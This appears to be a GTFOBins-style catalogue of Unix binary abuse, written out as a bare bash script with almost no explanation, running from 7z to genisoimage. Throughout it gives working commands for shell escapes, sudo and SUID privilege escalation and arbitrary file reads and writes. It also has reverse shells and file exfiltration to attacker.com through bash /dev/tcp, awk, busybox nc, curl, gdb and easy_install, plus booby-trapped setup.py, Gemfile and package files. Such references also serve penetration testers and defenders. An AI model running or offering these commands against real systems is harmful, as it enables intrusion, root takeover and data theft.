#!/bin/bash

LFILE=file_to_read
7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
LFILE=file_to_read
sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
URL=http://attacker.com/
LFILE=file_to_send
ab -p $LFILE $URL
URL=http://attacker.com/file_to_download
ab -v2 $URL
URL=http://attacker.com/
LFILE=file_to_send
./ab -p $LFILE $URL
URL=http://attacker.com/
LFILE=file_to_send
sudo ab -p $LFILE $URL
LFILE=file_to_read
alpine -F "$LFILE"
LFILE=file_to_read
./alpine -F "$LFILE"
LFILE=file_to_read
sudo alpine -F "$LFILE"
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF
LFILE=file_to_read
apache2ctl -c "Include $LFILE" -k stop
LFILE=file_to_read
sudo apache2ctl -c "Include $LFILE" -k stop
apt-get changelog apt
!/bin/sh
sudo apt-get changelog apt
!/bin/sh
TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt-get install -c $TF sl
apt changelog apt
!/bin/sh
sudo apt changelog apt
!/bin/sh
TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt install -c $TF sl
TF=$(mktemp -u)
LFILE=file_to_read
ar r "$TF" "$LFILE"
cat "$TF"
TF=$(mktemp -u)
LFILE=file_to_read
./ar r "$TF" "$LFILE"
cat "$TF"
TF=$(mktemp -u)
LFILE=file_to_read
sudo ar r "$TF" "$LFILE"
cat "$TF"
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x
URL=http://attacker.com/file_to_get
LFILE=file_to_save
aria2c -o "$LFILE" "$URL"
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo aria2c --on-download-error=$TF http://x
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
./aria2c --on-download-error=$TF http://x
TF=$(mktemp -u)
LFILE=file_to_read
arj a "$TF" "$LFILE"
arj p "$TF"
TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >"$TF/$LFILE"
arj a "$TF/a" "$TF/$LFILE"
arj e "$TF/a" $LDIR
TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >"$TF/$LFILE"
arj a "$TF/a" "$TF/$LFILE"
sudo arj e "$TF/a" $LDIR
TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >"$TF/$LFILE"
arj a "$TF/a" "$TF/$LFILE"
./arj e "$TF/a" $LDIR
LFILE=file_to_read
arp -v -f "$LFILE"
LFILE=file_to_read
./arp -v -f "$LFILE"
LFILE=file_to_read
sudo arp -v -f "$LFILE"
LFILE=file_to_read
as @$LFILE
LFILE=file_to_read
./as @$LFILE
LFILE=file_to_read
sudo as @$LFILE
LFILE=file_to_read
ascii-xfr -ns "$LFILE"
LFILE=file_to_read
./ascii-xfr -ns "$LFILE"
LFILE=file_to_read
sudo ascii-xfr -ns "$LFILE"
LFILE=file_to_read
ascii85 "$LFILE" | ascii85 --decode
LFILE=file_to_read
sudo ascii85 "$LFILE" | ascii85 --decode
export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'
LFILE=file_to_read
aspell -c "$LFILE"
LFILE=file_to_read
./aspell -c "$LFILE"
LFILE=file_to_read
sudo aspell -c "$LFILE"
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
COMMAND=id
echo "$COMMAND" | at now
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
LFILE=file_to_read
atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
LFILE=file_to_read
sudo atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
LFILE=file_to_read
./atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
RHOST=attacker.com
RPORT=12345
awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = "/inet/tcp/0/" RHOST "/" RPORT;
while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
LPORT=12345
awk -v LPORT=$LPORT 'BEGIN {
s = "/inet/tcp/" LPORT "/0/0";
while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
LFILE=file_to_write
awk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
LFILE=file_to_read
awk '//' "$LFILE"
LFILE=file_to_read
./awk '//' "$LFILE"
aws help
!/bin/sh
sudo aws help
!/bin/sh
LFILE=file_to_read
base32 "$LFILE" | base32 --decode
LFILE=file_to_read
base32 "$LFILE" | base32 --decode
LFILE=file_to_read
sudo base32 "$LFILE" | base32 --decode
LFILE=file_to_read
base58 "$LFILE" | base58 --decode
LFILE=file_to_read
sudo base58 "$LFILE" | base58 --decode
LFILE=file_to_read
base64 "$LFILE" | base64 --decode
LFILE=file_to_read
./base64 "$LFILE" | base64 --decode
LFILE=file_to_read
sudo base64 "$LFILE" | base64 --decode
LFILE=file_to_read
basenc --base64 $LFILE | basenc -d --base64
LFILE=file_to_read
basenc --base64 $LFILE | basenc -d --base64
LFILE=file_to_read
sudo basenc --base64 $LFILE | basenc -d --base64
LFILE=file_to_read
basez "$LFILE" | basez --decode
LFILE=file_to_read
./basez "$LFILE" | basez --decode
LFILE=file_to_read
sudo basez "$LFILE" | basez --decode
export RHOST=attacker.com
export RPORT=12345
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$LFILE)" > /dev/tcp/$RHOST/$RPORT'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
3<>/dev/tcp/$RHOST/$RPORT \
| { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
export LFILE=file_to_write
bash -c 'echo DATA > $LFILE'
LFILE=file_to_write
HISTIGNORE='history *'
history -c
DATA
history -w $LFILE
export LFILE=file_to_read
bash -c 'echo "$(<$LFILE)"'
LFILE=file_to_read
HISTTIMEFORMAT=$'\r\e[K'
history -r $LFILE
history
batcat --paging always /etc/profile
!/bin/sh
./batcat --paging always /etc/profile
!/bin/sh
sudo batcat --paging always /etc/profile
!/bin/sh
LFILE=file_to_read
bc -s $LFILE
quit
LFILE=file_to_read
sudo bc -s $LFILE
quit
LFILE=file_to_read
./bc -s $LFILE
quit
bconsole
@exec /bin/sh
sudo bconsole
@exec /bin/sh
TF=$(mktemp)
echo 'BEGIN {system("/bin/sh");exit()}' >$TF
sudo bpftrace $TF
LFILE=file_to_read
bridge -b "$LFILE"
LFILE=file_to_read
./bridge -b "$LFILE"
LFILE=file_to_read
sudo bridge -b "$LFILE"
bundle help
!/bin/sh
export BUNDLE_GEMFILE=x
bundle exec /bin/sh
TF=$(mktemp -d)
touch $TF/Gemfile
cd $TF
bundle exec /bin/sh
TF=$(mktemp -d)
touch $TF/Gemfile
cd $TF
bundle console
system('/bin/sh -c /bin/sh')
TF=$(mktemp -d)
echo 'system("/bin/sh")' > $TF/Gemfile
cd $TF
bundle install
sudo bundle help
!/bin/sh
bundler help
!/bin/sh
export BUNDLE_GEMFILE=x
bundler exec /bin/sh
TF=$(mktemp -d)
touch $TF/Gemfile
cd $TF
bundler exec /bin/sh
TF=$(mktemp -d)
touch $TF/Gemfile
cd $TF
bundler console
system('/bin/sh -c /bin/sh')
TF=$(mktemp -d)
echo 'system("/bin/sh")' > $TF/Gemfile
cd $TF
bundler install
sudo bundler help
!/bin/sh
busctl --show-machine
!/bin/sh
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
LPORT=12345
busybox httpd -f -p $LPORT -h .
LFILE=file_to_write
busybox sh -c 'echo "DATA" > $LFILE'
LFILE=file_to_read
./busybox cat "$LFILE"
RHOST=attacker.com
RPORT=12345
busybox nc -e /bin/sh $RHOST $RPORT
TF=$(mktemp)
echo 'system("/bin/sh")' > $TF
byebug $TF
continue
TF=$(mktemp)
echo 'system("/bin/sh")' > $TF
./byebug $TF
continue
TF=$(mktemp)
echo 'system("/bin/sh")' > $TF
sudo byebug $TF
continue
LFILE=file_to_read
bzip2 -c $LFILE | bzip2 -d
LFILE=file_to_read
./bzip2 -c $LFILE | bzip2 -d
LFILE=file_to_read
sudo bzip2 -c $LFILE | bzip2 -d
LFILE=file_to_read
c89 -x c -E "$LFILE"
LFILE=file_to_delete
c89 -xc /dev/null -o $LFILE
LFILE=file_to_read
c99 -x c -E "$LFILE"
LFILE=file_to_delete
c99 -xc /dev/null -o $LFILE
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT
LFILE=file_to_read
cat "$LFILE"
LFILE=file_to_read
./cat "$LFILE"
LFILE=file_to_read
sudo cat "$LFILE"
TF=$(mktemp -d)
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
TF=$(mktemp -d)
sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
LFILE=file_to_read
check_cups --extra-opts=@$LFILE
LFILE=file_to_read
sudo check_cups --extra-opts=@$LFILE
LFILE=file_to_read
OUTPUT=output_file
check_log -F $LFILE -O $OUTPUT
cat $OUTPUT
LFILE=file_to_write
INPUT=input_file
check_log -F $INPUT -O $LFILE
LFILE=file_to_write
INPUT=input_file
sudo check_log -F $INPUT -O $LFILE
LFILE=file_to_read
check_memory --extra-opts=@$LFILE
LFILE=file_to_read
sudo check_memory --extra-opts=@$LFILE
LFILE=file_to_read
check_raid --extra-opts=@$LFILE
LFILE=file_to_read
sudo check_raid --extra-opts=@$LFILE
COMMAND=id
OUTPUT=output_file
TF=$(mktemp)
echo "$COMMAND | tee $OUTPUT" > $TF
chmod +x $TF
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT
COMMAND=id
OUTPUT=output_file
TF=$(mktemp)
echo "$COMMAND | tee $OUTPUT" > $TF
chmod +x $TF
umask 022
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT
LFILE=file_to_read
check_statusfile $LFILE
LFILE=file_to_read
sudo check_statusfile $LFILE
LFILE=file_to_change
./chmod 6777 $LFILE
LFILE=file_to_change
sudo chmod 6777 $LFILE
LFILE=file_to_change
./chown $(id -un):$(id -gn) $LFILE
LFILE=file_to_change
sudo chown $(id -un):$(id -gn) $LFILE
./chroot / /bin/sh -p
sudo chroot /
LFILE=file_to_read
TF=$(mktemp -d)
touch $TF/empty.yara
clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
LFILE=file_to_read
TF=$(mktemp -d)
touch $TF/empty.yara
./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
LFILE=file_to_read
TF=$(mktemp -d)
touch $TF/empty.yara
sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
LFILE=file_to_read
cmp $LFILE /dev/zero -b -l
LFILE=file_to_read
./cmp $LFILE /dev/zero -b -l
LFILE=file_to_read
sudo cmp $LFILE /dev/zero -b -l
TF=$(mktemp -d)
echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
cobc -xFj --frelax-syntax-checks $TF/x
TF=$(mktemp -d)
echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
sudo cobc -xFj --frelax-syntax-checks $TF/x
LFILE=file_to_read
column $LFILE
LFILE=file_to_read
./column $LFILE
LFILE=file_to_read
sudo column $LFILE
LFILE=file_to_read
comm $LFILE /dev/null 2>/dev/null
LFILE=file_to_read
comm $LFILE /dev/null 2>/dev/null
LFILE=file_to_read
sudo comm $LFILE /dev/null 2>/dev/null
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
composer --working-dir=$TF run-script x
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
./composer --working-dir=$TF run-script x
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
cowsay -f $TF x
TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
sudo cowsay -f $TF x
TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
cowthink -f $TF x
TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
sudo cowthink -f $TF x
LFILE=file_to_read
cp "$LFILE" /dev/stdout
LFILE=file_to_write
echo "DATA" | cp /dev/stdin "$LFILE"
LFILE=file_to_write
echo "DATA" | ./cp /dev/stdin "$LFILE"
LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
./cp $TF $LFILE
LFILE=file_to_change
./cp --attributes-only --preserve=all ./cp "$LFILE"
LFILE=file_to_write
echo "DATA" | sudo cp /dev/stdin "$LFILE"
LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
sudo cp $TF $LFILE
sudo cp /bin/sh /bin/cp
sudo cp
`cpan` lets you execute perl commands with the `! command`.
cpan
! exec '/bin/bash'
export RHOST=localhost
export RPORT=9000
cpan
! use Socket; my $i="$ENV{RHOST}"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};
cpan
! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();
export URL=http://attacker.com/file_to_get
cpan
! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();
sudo cpan
! exec '/bin/bash'
echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
LFILE=file_to_read
echo "$LFILE" | cpio -o
LFILE=file_to_read
TF=$(mktemp -d)
echo "$LFILE" | cpio -dp $TF
cat "$TF/$LFILE"
LFILE=file_to_write
LDIR=where_to_write
echo DATA >$LFILE
echo $LFILE | cpio -up $LDIR
LFILE=file_to_read
TF=$(mktemp -d)
echo "$LFILE" | ./cpio -R $UID -dp $TF
cat "$TF/$LFILE"
LFILE=file_to_write
LDIR=where_to_write
echo DATA >$LFILE
echo $LFILE | ./cpio -R 0:0 -p $LDIR
echo '/bin/sh </dev/tty >/dev/tty' >localhost
sudo cpio -o --rsh-command /bin/sh -F localhost:
LFILE=file_to_read
TF=$(mktemp -d)
echo "$LFILE" | sudo cpio -R $UID -dp $TF
cat "$TF/$LFILE"
LFILE=file_to_write
LDIR=where_to_write
echo DATA >$LFILE
echo $LFILE | sudo cpio -R 0:0 -p $LDIR
crash -h
!sh
COMMAND='/usr/bin/id'
CRASHPAGER="$COMMAND" crash -h
sudo crash -h
!sh
export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'
LFILE=file_to_read
csplit $LFILE 1
cat xx01
TF=$(mktemp)
echo "DATA" > $TF
LFILE=file_to_write
csplit -z -b "%d$LFILE" $TF 1
LFILE=file_to_read
csplit $LFILE 1
cat xx01
LFILE=file_to_read
csplit $LFILE 1
cat xx01
LFILE=file_to_read
csvtool trim t $LFILE
LFILE=file_to_write
TF=$(mktemp)
echo DATA > $TF
csvtool trim t $TF -o $LFILE
LFILE=file_to_read
./csvtool trim t $LFILE
LFILE=file_to_read
cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
LFILE=file_to_read
sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
LFILE=file_to_read
./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
URL=http://attacker.com/
LFILE=file_to_send
curl -X POST -d "@$LFILE" $URL
URL=http://attacker.com/file_to_get
LFILE=file_to_save
curl $URL -o $LFILE
LFILE=/tmp/file_to_read
curl file://$LFILE
LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
curl "file://$TF" -o "$LFILE"
URL=http://attacker.com/file_to_get
LFILE=file_to_save
./curl $URL -o $LFILE
URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo curl $URL -o $LFILE
LFILE=file_to_read
cut -d "" -f1 "$LFILE"
LFILE=file_to_read
./cut -d "" -f1 "$LFILE"
LFILE=file_to_read
sudo cut -d "" -f1 "$LFILE"
export LFILE=file_to_write
dash -c 'echo DATA > $LFILE'
LFILE=file_to_read
date -f $LFILE
LFILE=file_to_read
./date -f $LFILE
LFILE=file_to_read
sudo date -f $LFILE
LFILE=file_to_write
echo "DATA" | dd of=$LFILE
LFILE=file_to_read
dd if=$LFILE
LFILE=file_to_write
echo "data" | ./dd of=$LFILE
LFILE=file_to_write
echo "data" | sudo dd of=$LFILE
debugfs
!/bin/sh
./debugfs
!/bin/sh
sudo debugfs
!/bin/sh
LFILE=file_to_read
dialog --textbox "$LFILE" 0 0
LFILE=file_to_read
./dialog --textbox "$LFILE" 0 0
LFILE=file_to_read
sudo dialog --textbox "$LFILE" 0 0
LFILE=file_to_read
diff --line-format=%L /dev/null $LFILE
LFOLDER=folder_to_list
TF=$(mktemp -d)
diff --recursive $TF $LFOLDER
LFILE=file_to_read
./diff --line-format=%L /dev/null $LFILE
LFILE=file_to_read
sudo diff --line-format=%L /dev/null $LFILE
LFILE=file_to_read
dig -f $LFILE
LFILE=file_to_read
sudo dig -f $LFILE
LFILE=file_to_read
./dig -f $LFILE
LFILE=file_to_read
dmesg -rF "$LFILE"
dmesg -H
!/bin/sh
sudo dmesg -H
!/bin/sh
It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.
Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.
- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.
- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.
```
make dmiwrite
TF=$(mktemp)
echo "DATA" > $TF
./dmiwrite $TF x.dmi
```
LFILE=file_to_write
sudo dmidecode --no-sysfs -d x.dmi --dump-bin "$LFILE"
sudo dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
sudo dmsetup ls --exec '/bin/sh -s'
./dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
./dmsetup ls --exec '/bin/sh -p -s'
It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```
sudo dnf install -y x-1.0-1.noarch.rpm
CONTAINER_ID="$(docker run -d alpine)" # or existing
TF=$(mktemp)
echo "DATA" > $TF
docker cp $TF $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF file_to_write
CONTAINER_ID="$(docker run -d alpine)"  # or existing
TF=$(mktemp)
docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF
LFILE1=file_to_read
LFILE2=file_to_write
dos2unix -f -n "$LFILE1" "$LFILE2"
LFILE='\path\to\file_to_read'
dosbox -c 'mount c /' -c "type c:$LFILE"
LFILE='\path\to\file_to_read'
dosbox -c 'mount c /' -c "copy c:$LFILE c:\tmp\output" -c exit
cat '/tmp/OUTPUT'
LFILE='\path\to\file_to_write'
dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
LFILE='\path\to\file_to_write'
./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
LFILE='\path\to\file_to_write'
sudo dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
export LFILE=file_to_read
dotnet fsi
System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable("LFILE"));;
sudo dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
dpkg -l
!/bin/sh
sudo dpkg -l
!/bin/sh
It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
```
mkdir -p ~/.dstat
echo 'import os; os.execv("/bin/sh", ["sh"])' >~/.dstat/dstat_xxx.py
dstat --xxx
echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
sudo dstat --xxx
tex '\special{psfile="`/bin/sh 1>&0"}\end'
dvips -R0 texput.dvi
tex '\special{psfile="`/bin/sh 1>&0"}\end'
sudo dvips -R0 texput.dvi
tex '\special{psfile="`/bin/sh 1>&0"}\end'
./dvips -R0 texput.dvi
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
easy_install $TF
export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > $TF/setup.py
easy_install $TF
export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' > $TF/setup.py
easy_install $TF
export LPORT=8888
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
easy_install $TF
export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo "import os;
os.execl('$(whereis python)', '$(whereis python)', '-c', \"\"\"import sys;
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve('$URL', '$LFILE')\"\"\")" > $TF/setup.py
pip install $TF
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo "import os;
os.execl('$(whereis python)', 'python', '-c', 'open(\"$LFILE\",\"w+\").write(\"DATA\")')" > $TF/setup.py
easy_install $TF
TF=$(mktemp -d)
echo 'print(open("file_to_read").read())' > $TF/setup.py
easy_install $TF
TF=$(mktemp -d)
echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
easy_install $TF
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
eb logs
!/bin/sh
sudo eb logs
!/bin/sh
ed
!/bin/sh
ed file_to_write
a
DATA
.
w
q
ed file_to_read
,p
q
./ed file_to_read
,p
q
sudo ed
!/bin/sh
./ed
!/bin/sh
LFILE=file_to_read
./efax -d "$LFILE"
LFILE=file_to_read
sudo efax -d "$LFILE"
export LFILE=file_to_read
elvish -c 'echo (slurp <$E:LFILE)'
export LFILE=file_to_write
elvish -c 'echo DATA >$E:LFILE'
emacs file_to_write
DATA
C-x C-s
LFILE=file_to_read
eqn "$LFILE"
LFILE=file_to_read
./eqn "$LFILE"
LFILE=file_to_read
sudo eqn "$LFILE"
LFILE=file_to_read
espeak -qXf "$LFILE"
LFILE=file_to_read
./espeak -qXf "$LFILE"
LFILE=file_to_read
sudo espeak -qXf "$LFILE"
ex
!/bin/sh
ex file_to_write
a
DATA
.
w
q
ex file_to_read
,p
q
sudo ex
!/bin/sh
LFILE=file_to_read
OUTPUT=output_file
exiftool -filename=$OUTPUT $LFILE
cat $OUTPUT
LFILE=file_to_write
INPUT=input_file
exiftool -filename=$LFILE $INPUT
LFILE=file_to_write
INPUT=input_file
sudo exiftool -filename=$LFILE $INPUT
LFILE=file_to_read
expand "$LFILE"
LFILE=file_to_read
./expand "$LFILE"
LFILE=file_to_read
sudo expand "$LFILE"
LFILE=file_to_read
expect $LFILE
TF=$(mktemp -d)
echo 'exec("/bin/sh")' > $TF/x.rb
FACTERLIB=$TF facter
TF=$(mktemp -d)
echo 'exec("/bin/sh")' > $TF/x.rb
sudo FACTERLIB=$TF facter
LFILE=file_to_read
file -f $LFILE
Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.
If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.
It can also be provided with a directory and will read each file in the directory.
LFILE=file_to_read
file -m $LFILE
LFILE=file_to_read
./file -f $LFILE
LFILE=file_to_read
sudo file -f $LFILE
LFILE=file_to_write
find / -fprintf "$FILE" DATA -quit
RHOST=attacker.com
LFILE=file_to_send
finger "$(base64 $LFILE)@$RHOST"
RHOST=attacker.com
LFILE=file_to_save
finger x@$RHOST | base64 -d > "$LFILE"
LFILE=file_to_read
fmt -pNON_EXISTING_PREFIX "$LFILE"
LFILE=file_to_read
fmt -999 "$LFILE"
LFILE=file_to_read
./fmt -999 "$LFILE"
LFILE=file_to_read
sudo fmt -999 "$LFILE"
LFILE=file_to_read
fold -w99999999 "$LFILE"
LFILE=file_to_read
./fold -w99999999 "$LFILE"
LFILE=file_to_read
sudo fold -w99999999 "$LFILE"
LFILE=file_to_read
fping -f $LFILE
LFILE=file_to_read
sudo fping -f $LFILE
ftp
!/bin/sh
RHOST=attacker.com
ftp $RHOST
put file_to_send
RHOST=attacker.com
ftp $RHOST
get file_to_get
sudo ftp
!/bin/sh
RHOST=attacker.com
RPORT=12345
gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = "/inet/tcp/0/" RHOST "/" RPORT;
while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
LPORT=12345
gawk -v LPORT=$LPORT 'BEGIN {
s = "/inet/tcp/" LPORT "/0/0";
while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
LFILE=file_to_write
gawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
LFILE=file_to_read
gawk '//' "$LFILE"
LFILE=file_to_read
./gawk '//' "$LFILE"
LFILE=file_to_read
gcc -x c -E "$LFILE"
LFILE=file_to_read
gcc @"$LFILE"
LFILE=file_to_delete
gcc -xc /dev/null -o $LFILE
gcloud help
!/bin/sh
sudo gcloud help
!/bin/sh
export RHOST=attacker.com
export RPORT=12345
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' -ex quit
export URL=http://attacker.com/
export LFILE=file_to_send
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' -ex quit
export LPORT=8888
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])' -ex quit
LFILE=file_to_write
gdb -nx -ex "dump value $LFILE \"DATA\"" -ex quit
gem open rdoc
:!/bin/sh
TF=$(mktemp -d)
echo 'system("/bin/sh")' > $TF/x
gem build $TF/x
TF=$(mktemp -d)
echo 'system("/bin/sh")' > $TF/x
gem install --file $TF/x
LFILE=file_to_read
genisoimage -q -o - "$LFILE"
LFILE=file_to_read
./genisoimage -sort "$LFILE"
LFILE=file_to_read
